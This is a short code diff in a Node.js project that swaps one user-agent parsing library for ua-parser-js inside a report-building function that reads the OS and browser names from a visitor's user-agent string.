@@ -1,5 +1,5 @@
 import fetch from 'node-fetch';
-import { parseUserAgent } from 'useragent-parser';
+import UAParser from 'ua-parser-js';
 
 // Configuration
 const config = {
@@ -67,7 +67,8 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
         return {};
       });
     
-    const agentInfo = parseUserAgent(useragent);
+    const parser = new UAParser(useragent);
+    const agentInfo = parser.getResult();
     const os = agentInfo.os?.name || 'Unknown';
     const browser = agentInfo.browser?.name || 'Unknown';
     
